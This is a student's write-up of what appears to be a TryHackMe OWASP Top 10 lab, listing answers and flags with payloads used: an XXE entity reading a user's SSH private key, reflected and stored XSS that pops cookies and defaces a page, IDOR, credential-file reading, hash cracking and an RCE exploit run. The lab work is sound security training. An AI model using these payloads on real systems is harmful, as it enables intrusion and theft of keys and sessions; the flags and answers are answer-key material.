---
layout: page
title: OWASP Top 10
permalink: /CSCI24/OWASPTop10/
---

---

[CSCI 24 Directory](https://zacvr.github.io/CSCI24/)
<br/>

---
<br/>


Task 5
---

What strange text file is in the website root directory?

If we search with ls we will see the files in the root directory

```ls```

<img src="/images/CSCI24/OWASPTop10/Task 5 Q1.png">

***drpepper.txt***

How many non-root/non-service/non-daemon users are there?

```cat /etc/passwd```

***0***

What user is this app running as?

```whoami```

***www-data ***

What is the user's shell set as?

```cat /etc/passwd```

***/usr/sbin/nologin***

What version of Ubuntu is running?

```lsb_release -a```

***18.04.4***

Print out the MOTD.  What favorite beverage is shown?

```cat /etc/update-motd.d/00-header```

***Dr Pepper*** Shocker right?

Task 7
---

What is the flag that you found in darren's account?

If we try to register a name of " darren" (with the quotes) we can then login as " darren" without the quotes but with the space 

<img src="/images/CSCI24/OWASPTop10/Task 7 Q1.png">

***fe86079416a21a3c99937fea8874b667***


Now try to do the same trick and see if you can login as arthur.
What is the flag that you found in arthur's account?

***d9ac0f7db4fda460ac3edeb75d75e16e***


Task 11
---

After quite a few minutes of not realizing that I needed to boot up a different machine we are finally ready!

Lets look at the source of the login page

<img src="/images/CSCI24/OWASPTop10/Task 11 Q1.png">

What is the name of the mentioned directory?

***/assets***


Navigate to the directory you found in question one. What file stands out as being likely to contain sensitive data?


<img src="/images/CSCI24/OWASPTop10/Task 11 Q2.png">

***webapp.db***


Use the supporting material to access the sensitive data. What is the password hash of the admin user?

Now we need to download this file and try to get into it

```cd Downloads/```
```sqlite3 webapp.db```
```.tables```
Here we see tables named "sessions" and "users"
```PRAGMA table_info(users);```
```select * from users```
<img src="/images/CSCI24/OWASPTop10/Task 11 Q3.png">

<img src="/images/CSCI24/OWASPTop10/Task 11 Q3.5.png">
looks to be the admin hash, lets try to see what it is!

***6eea9b7ef19179a06954edd0f6c05ceb***

Crack the hash.
What is the admin's plaintext password?

***qwertyuiop***


Login as the admin. What is the flag?

If we sign in we see a flag

***THM{Yzc2YjdkMjE5N2VjMzNhOTE3NjdiMjdl}***


Task 13
---

Full form of XML

***eXtensible Markup Language***


Is it compulsory to have XML prolog in XML documents?

***No***


Can we validate XML documents against a schema?

***Yes***


How can we specify XML version and encoding in XML document?

***XML Prolog***


Task 14
---

How do you define a new ELEMENT?

***!ELEMENT***


How do you define a ROOT element?

***!DOCTYPE***


How do you define a new ENTITY?

***!ENTITY***


Task 16
---

What is the name of the user in /etc/passwd

***Falcon***


Where is falcon's SSH key located?

if we type

```<?xml version="1.0"?>```
```<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///home/falcon/.ssh/id_rsa'>]>```
```<root>&read;</root>```

we will see the RSA key
<img src="/images/CSCI24/OWASPTop10/Task 16 Q4.png">

***/home/Falcon/.ssh/id_rsa***


What are the first 18 characters for falcon's private key

***MIIEogIBAAKCAQEA7bq***


Task 18
---

Look at other users notes. What is the flag?

After we login if we change "note=1" to "note=0"

***flag{fivefourthree}***


Task 19
---

After some testing of default passwords (admin/password/blank etc) with no luck I decided to lookup Pensive Notes default passwords and found

```user:pensive```
```pass:PensiveNotes```

Hack into the webapp, and find the flag!

***thm{4b9513968fd564a87b28aa1f9d672e17}***


Task 20
---

Navigate to http://MACHINE_IP/ in your browser and click on the "Reflected XSS" tab on the navbar; craft a reflected XSS payload that will cause a popup saying "Hello".

above we see that we can use "<script>alert(“Hello”)</script>" to create popups

<img src="/images/CSCI24/OWASPTop10/Task 20 Q1.png">

***ThereIsMoreToXSSThanYouThink***


On the same reflective page, craft a reflected XSS payload that will cause a popup with your machines IP address.

```<script>alert(window.location.hostname)</script>```

***ReflectiveXss4TheWin***


Now navigate to http://MACHINE_IP/ in your browser and click on the "Stored XSS" tab on the navbar; make an account.

Then add a comment and see if you can insert some of your own HTML.

```<h1>Mic Test</h1>```

***HTML_T4gs***


On the same page, create an alert popup box appear on the page with your document cookies.

```<script>alert(document.cookie)</script>```

***W3LL_D0N3_LVL2***


Change "XSS Playground" to "I am a hacker" by adding a comment and using Javascript.

```<script>document.querySelector('#thm-title').textContent = 'I am a hacker'</script>```

***websites_can_be_easily_defaced_with_xss***


Task 21
---

Who developed the Tomcat application?

***The Apache Software Foundation***


What type of attack that crashes services can be performed with insecure deserialization?

***Denial of Service***


Task 22
---

Select the correct term of the following statement:
if a dog was sleeping, would this be:

A) A State
B) A Behaviour 

***A behaviour***


Task 23
---

What is the name of the base-2 formatting that data is sent across a network as? 

***Binary***


Task 24
---

If a cookie had the path of webapp.com/login , what would the URL that the user has to visit be?

***webapp.c om/login***


What is the acronym for the web technology that Secure cookies work over?

***HTTPS***


Task 25
---

1st flag (cookie value)

One cookie is in Base64
"0TU5YzUxYTA2NjY3NGI0OWEzZWM5MDk4ZTU1ODlkMGNxAlgLAAAAZW5jb2RlZGZsYWdxA1gYAAAAVEhNe2dvb2Rfb2xkX2Jhc2U2NF9odWh9cQR1Lg=="

***THM{good_old_base64_huh)***


2nd flag (admin dashboard)

***THM{heres_the_admin_flag}***


Task 26
---

flag.txt

This one would not work correctly for me

***4a69a7ff9fd68***


Task 29
---

After searching bookstore app rce we foudn an exploit

```python3 bookstore_rce.py 10.10.64.138```

How many characters are in /etc/passwd (use wc -c /etc/passwd to get the answer)

***1611***


Task 30
---

What IP address is the attacker using?

***49.99.13.16***


What kind of attack is being carried out?

***Brute Force***

